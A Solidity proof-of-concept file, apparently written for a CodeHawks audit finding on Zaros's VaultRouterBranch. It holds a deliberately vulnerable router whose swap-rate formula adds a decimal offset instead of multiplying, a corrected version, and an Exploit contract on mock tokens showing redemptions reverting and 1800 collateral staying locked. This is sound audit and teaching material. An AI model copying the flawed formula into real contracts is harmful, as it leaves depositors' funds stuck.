// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Zaros VaultRouterBranch — CodeHawks 2025-01 Part 2.
    getIndexTokenSwapRate adds 10**decimalOffset to a 6-decimal totalSupply
    instead of multiplying. Redeeming the report's 20e18 shares quotes
    ~3.59e28 collateral against a vault that holds 1800e18. The transfer
    reverts and the 1800e18 stays in the router. Multiplying supply by the
    offset quotes 27.27e18, which the vault can pay.
*/

contract Collateral {
    string public symbol = "USD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract IndexToken {
    string public symbol = "ZLP";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract VaultRouterBranch {
    uint8 public constant SYSTEM_DECIMALS = 18;
    IndexToken public indexToken;
    Collateral public collateral;

    constructor(IndexToken index_, Collateral collateral_) {
        indexToken = index_;
        collateral = collateral_;
    }

    function getIndexTokenSwapRate(uint256 sharesIn) public view returns (uint256 previewAssetsOut) {
        uint8 decimalOffset = SYSTEM_DECIMALS - indexToken.decimals();
        uint256 totalAssetsMinusVaultDebt = collateral.balanceOf(address(this));
        // @> VULN: totalSupply is added to 10**decimalOffset instead of multiplied, so the redeem quote is not 18-decimal collateral
        previewAssetsOut = sharesIn * totalAssetsMinusVaultDebt / (indexToken.totalSupply() + 10 ** uint256(decimalOffset));
    }

    function redeem(uint256 sharesIn) external returns (uint256 paid) {
        paid = getIndexTokenSwapRate(sharesIn);
        require(collateral.transfer(msg.sender, paid), "pay");
    }
}

contract VaultRouterBranchFixed {
    uint8 public constant SYSTEM_DECIMALS = 18;
    IndexToken public indexToken;
    Collateral public collateral;

    constructor(IndexToken index_, Collateral collateral_) {
        indexToken = index_;
        collateral = collateral_;
    }

    function getIndexTokenSwapRate(uint256 sharesIn) public view returns (uint256 previewAssetsOut) {
        uint8 decimalOffset = SYSTEM_DECIMALS - indexToken.decimals();
        uint256 totalAssetsMinusVaultDebt = collateral.balanceOf(address(this));
        previewAssetsOut = sharesIn * totalAssetsMinusVaultDebt / (indexToken.totalSupply() * 10 ** uint256(decimalOffset));
    }

    function redeem(uint256 sharesIn) external returns (uint256 paid) {
        paid = getIndexTokenSwapRate(sharesIn);
        require(collateral.transfer(msg.sender, paid), "pay");
    }
}

contract Exploit {
    uint256 public constant SHARES_IN = 20 ether;
    uint256 public constant VAULT_ASSETS = 1800 ether;
    uint256 public constant SUPPLY = 1320e6;

    Collateral public collateral;
    IndexToken public indexToken;
    VaultRouterBranch public router;
    uint256 public quoted;
    uint256 public fair;
    bool public redeemReverted;
    uint256 public stillLocked;

    constructor() {
        collateral = new Collateral();
        indexToken = new IndexToken();
        router = new VaultRouterBranch(indexToken, collateral);
        indexToken.mint(address(0xBEEF), SUPPLY);
    }

    function run() external {
        collateral.mint(address(router), VAULT_ASSETS);
        quoted = router.getIndexTokenSwapRate(SHARES_IN);
        fair = SHARES_IN * VAULT_ASSETS / (SUPPLY * 10 ** 12);
        require(quoted > VAULT_ASSETS, "quote exceeds the vault");
        require(fair == 27272727272727272727, "fair 27.27 collateral");
        require(fair < VAULT_ASSETS, "fair would fit");
        try router.redeem(SHARES_IN) returns (uint256) {
            redeemReverted = false;
        } catch {
            redeemReverted = true;
        }
        stillLocked = collateral.balanceOf(address(router));
        require(redeemReverted, "redeem should revert");
        require(stillLocked == VAULT_ASSETS, "1800 collateral stays locked");
        require(collateral.balanceOf(address(this)) == 0, "LP received nothing");
    }
}
